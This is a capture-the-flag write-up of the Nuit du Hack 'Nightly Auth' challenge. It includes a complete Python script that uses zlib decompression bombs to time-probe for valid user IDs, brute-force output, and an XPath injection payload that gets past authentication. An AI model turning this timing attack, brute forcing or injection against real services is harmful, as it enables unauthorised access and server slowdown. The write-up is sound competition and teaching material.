# Nuit du Hack CTF Qualifications: Nightly Auth

**Category:** Miscellaneous

**Points:** 400

**Description:**
> Your goal is to authenticate to the service IP: 54.217.202.218 Port: 1337
>
> [`Nightlyauth.tar.gz`](Nightlyauth.tar.gz)

## Write-up

The provided [`Nightlyauth.tar.gz`](Nightlyauth.tar.gz) file contains parts of the source code for a server-side script and a client.

The server reads the client data until it sends a packet ending with `\x45\x4f\x53` (EOS).

```python
while line[-3:] != "\x45\x4f\x53":
  data = socket.recv(1024)
  if not data:
    break
  line += data
  cur_data += 1
  # If the client have sent too much packets, kick it.
  if cur_data >= max_data:
    kick_notice(socket,"Too much data.")
    line = ""
    break
if line:
  print("[~] Checking token.")
  auth_class.check_token(line)
```

After receiving all the client data, the server checks if the supplied username is valid.

```python
def check_token(self,token):
  print("[~] Processing token...")
  # Split the data and check the opcode.
  data = re.split(regexsplitter, token)
  if data[0] == "1":
    print("[+] TOKEN_REQUEST !")
    # Check if the user is valid...
    if check_username(data[1]):
      print("[+] Valid UserID :)")
      # Generate a token for the client.
      self.process(data)
    else:
      print("[!] Bad UserID...")
      self.fail()
  elif data[0] == "2":
    print("[+] AUTH_REQUEST !")
    self.process(data)
```

Let’s take a look at the client.

```python
  def token_packet(self,uid,pwd):
      print("[~] Sending TOKEN Request...")
      return ("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (1, uid, pwd))

  def auth_packet(self,uid,pwd,token):
      print("[~] Sending AUTH Request...")
      return ("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (2, uid, pwd, token))

  def get_challenge(self):
    s = self.make_socket()
    s.sendall(self.token_packet(self.uid,self.pwd))
    data = s.recv(1024)
    self.nonce = data
    print("Got new challenge. Len: %s" % len(self.nonce))
    s.close()

  def auth(self):
    print("[~] Sending with new challenge...")
    s = self.make_socket()
    s.sendall(self.auth_packet(self.uid,self.pwd,self.nonce))
    print("Server response: %s" % s.recv(1024))
    s.close()

if __name__ == "__main__":
  print("Client started.")
  auth = Authentification()
  auth.set_credentials("1","password")
  auth.get_challenge()
  auth.auth()
```

1. The client first sends a `get_challenge` (Opcode: 1) request, with an UID and a password.
2. The server answers with a token. The size differs with every packet.
3. The client sends an `auth_packet` (Opcode: 2) with the same UID, the same password and the token sent by the server.

After trying the client with username `1`, the server sent me a token. The same thing happened for username `2`. It seems that even if the username is invalid, the server always sends a token. So we can’t guess if the username is valid or not based on the token…

The server had a problem with **load balancing**: after our first `get_challenge` request, the `auth_packet` was redirected to another server. That wasn’t a problem for exploiting, we just had to sent the `auth_packet` five times until we hit the right server (round-robin and 5 servers).

Let’s take a look at the `process()` function…

```python
def process(self,data):
  if data[3] != "EOS": #If it's not an TOKEN Request, decompress the current token token.
    print("[~] Decompressing the token...")
    token = decompress(data[3])
  if data[0] == "1": # If it's a token request, create and sent a new token.
    print("[TOKEN_REQUEST] Generating a valid token...")
    self.send_token(data[1],data[2])
    return True
  if token:
    print("[AUTH_REQUEST] Verifying the token...")
    time.sleep(3) # Sleep for blocking bruteforce attacks.
    if self.token_verifier.verify(token,data[1],data[2]):
      AuthSuccess()
      return True
    else:
      AuthFail()
      return False
```

Looking at the client code, we can see user data is separated with `\x02\x01\x02\x01`.

In the `process` function, called only if the username is valid, we can see that the server is checking if `data[3]` contains `EOS`, if not it decompresses the token. That means that if we send a `get_challenge` packet (Opcode 1), with a **fourth field** (a token), it will **decompress** this field and will not go to `time.sleep(3) # Sleep for blocking bruteforce attacks`!

**Decompressing data can take time**, and because **`process()` is only called when a user is valid**, we can guess if the username is valid by looking at the response time. Let’s try to exploit this flaw!

First of all, we have to guess which username is valid… This little exploit will help you.

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
__author__ = 'nightlydev <n.chatelain[at]sysdream.com>'
from timeit import default_timer
from zlib import compress, decompress
import socket
from numpy import mean
import time

class TimingAttack:
  def __init__(self,target):
    self.payload = None
    self.bombtimer = None
    self.target = target
    # We generate a ZIP Bomb to make the server lag.
    self.generate_exploit()
    print("[~] Timing attack ready.")

  def generate_exploit(self):
    # We compress a lot of "zeroes", small payload to send, but can take some time to decompress :) !
    print("[~] Generating bomb...")
    start = default_timer()
    self.payload = compress('0'*40000000)
    stop = default_timer()
    print("[+] Bomb generated - Took: %f to compress." % (stop - start))
    time.sleep(1)
    # We try to decompress the payload, which will be used as a trigger
    start = default_timer()
    decompress(self.payload)
    stop = default_timer()
    self.bombtimer = (stop - start)/2 # You have to adjust this offset if you have a lot of false positives
    print("[+] Bomb test - Time offset set: %f." % self.bombtimer)

  def create_socket(self):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(self.target)
    return s

  def avg_timer(self):
    # We first need to get the average response time of the server.
    timers = []
    sock = self.create_socket()
    for x in range(0,50):
      took = self.send_exploit(x)
      timers.append(took)
    print("[~] Average response time: %f" % mean(timers))
    # When a response is higher than the trigger, this may be caused by a decompression.
    self.trigger = mean(timers)+self.bombtimer

  def bruteforce(self,max_uids=10000):
    print("[~] Sending TOKEN probes...")
    start = default_timer()
    # We try to determine which usernames are valid.
    for userid in range(1,max_uids+1):
      current = (float(userid)/max_uids)*100
      timer = self.send_exploit(userid)
      print('[~] Uid: %d took: %f (%d%% completed)' % (userid,timer,current))
      if timer >= self.trigger:
        stop = default_timer()
        print("[+] Possible valid UID: %d found in %d seconds." % (userid,(stop-start)))
        # We check if the userid is a false positive.
        self.confirm(userid)
    print("[+] Timing attack done.")

  def send_exploit(self, user_id):
    # We send a payload, and get the time it needs to answer.
    sock = self.create_socket()
    self.send_payload(sock,user_id)
    start = default_timer()
    data = sock.recv(1024)
    stop = default_timer()
    sock.close()
    return (stop-start)

  def confirm(self,uid):
    # This function is used to test if a userid is valid.
    success = 0
    for attempt in range(0,20):
      took = self.send_exploit(uid)
      print("[~] Test n°%d: %f" % (attempt,took))
      if (took >= self.trigger):
        print("[+] BANGARANG!")
        success += 1
      else:
        print("[-] Nooooooo!")
    success_rate = float(success)/20*100
    print("[~] Test results: %d seems to be %f%% valid." % (uid,success_rate))
    if success_rate >= 50:
      print("[+] User ID: %d doesn't seem to be a false positive." % uid)
      while True:
        password = raw_input("Enter password (cancel with 'quit')\nNightlysploit $> ")
        if password == "quit": break
        self.establish_connection(uid,password)

  def establish_connection(self,uid,password):
    # This function is used to test if a username is valid.
    sock = self.create_socket()
    print("[~] Sending get_challenge")
    sock.sendall("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (1, uid, password))
    challenge = sock.recv(1024)
    sock.close()
    print("[~] Got challenge... Sending auth.")
    # We send the auth 5 times because of load-balancing.
    for x in range(0,5):
      sock = self.create_socket()
      sock.sendall("%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01\x45\x4f\x53" % (2, uid, password, challenge))
      response = sock.recv(1024)
      if (response == "You were kicked by the NightlyAUTH Server. Reason: Authentification failed.\n"):
        print("[~] Auth failed...")
      else:
        print("[+] Server answered: %s" % response)

  def chunks(self, l, n):
    return [l[i:i+n] for i in range(0, len(l), n)]

  def send_payload(self,sock,uid):
    counter = 0
    #      OPCODE       UID         PASS
    sock.sendall("1\x02\x01\x02\x01%s\x02\x01\x02\x01%s\x02\x01\x02\x01" % (uid,"ninja"))
    for data in self.chunks(self.payload,980):
      counter += 1
      sock.sendall(data)
    # END OF STREAM
    sock.sendall("\x45\x4f\x53")

if __name__ == "__main__":
  boom = TimingAttack(("54.217.202.218",1337))
  print("[~] Discovering average response time...")
  boom.avg_timer()
  print("[~] Bruteforcing...")
  boom.bruteforce()
```

After **8 minutes** on a cheap VPS server, we get the following result:

```
[~] Uid: 3240 took: 0.068480 (32% completed)
[~] Uid: 3241 took: 0.069281 (32% completed)
[~] Uid: 3242 took: 0.069874 (32% completed)
[~] Uid: 3243 took: 0.224517 (32% completed)
[+] Possible valid UID: 3243 found in 484 seconds.
[~] Test n°0: 0.215680
[+] BANGARANG!
[~] Test n°1: 0.217219
[+] BANGARANG!
[~] Test n°2: 0.208675
[+] BANGARANG!
[~] Test n°3: 0.199905
[+] BANGARANG!
[~] Test n°4: 0.229774
[+] BANGARANG!
[~] Test n°5: 0.208620
[+] BANGARANG!
[~] Test n°6: 0.193230
[+] BANGARANG!
[~] Test n°7: 0.204750
[+] BANGARANG!
[~] Test n°8: 0.215756
[+] BANGARANG!
[~] Test n°9: 0.211181
[+] BANGARANG!
[~] Test n°10: 0.196094
[+] BANGARANG!
[~] Test n°11: 0.213732
[+] BANGARANG!
[~] Test n°12: 0.197914
[+] BANGARANG!
[~] Test n°13: 0.195056
[+] BANGARANG!
[~] Test n°14: 0.210873
[+] BANGARANG!
[~] Test n°15: 0.201116
[+] BANGARANG!
[~] Test n°16: 0.218596
[+] BANGARANG!
[~] Test n°17: 0.216802
[+] BANGARANG!
[~] Test n°18: 0.215007
[+] BANGARANG!
[~] Test n°19: 0.222972
[+] BANGARANG!
[~] Test results: 3243 seems to be 100.000000% valid.
[+] User ID: 3243 doesn't seem to be a false positive.
Enter password (cancel with 'quit')
Nightlysploit $>
```

We can see a **big** difference between a bad user ID and a good user ID. (+0.15 seconds) If the network is *unstable*, we just have to raise the number of zeroes to compress.

Ok, we have a good user id, but we don’t have a password. Let’s see if we can enter a random password…

```
Nightlysploit $> nico
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
```

Ok, it doesn’t work. Let’s try with something more… **agressive**.

```
Nightlysploit $> "'��u("'�f"�ht"
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered :
```

Something happened! Maybe it’s the quotes… After trying a single quote, it seems that a double quote is making the server behave strangely. Could this be SQL injection?

```
Nightlysploit $> " OR 1=1 OR "
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered :
```

Nope, it makes the application behave strangely too… It looks like SQL, but it isn’t. Maybe it’s XPath? Let’s retry the earlier injection with lowercase characters.

```
Nightlysploit $> " or 1=1 or "
[~] Sending get_challenge
[~] Got challenge... Sending auth.
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[~] Auth failed...
[+] Server answered: The flag is: D34RG0DILUVC00KIEZ
```

Boom. The flag is `D34RG0DILUVC00KIEZ`.

## Other write-ups and resources

* none yet
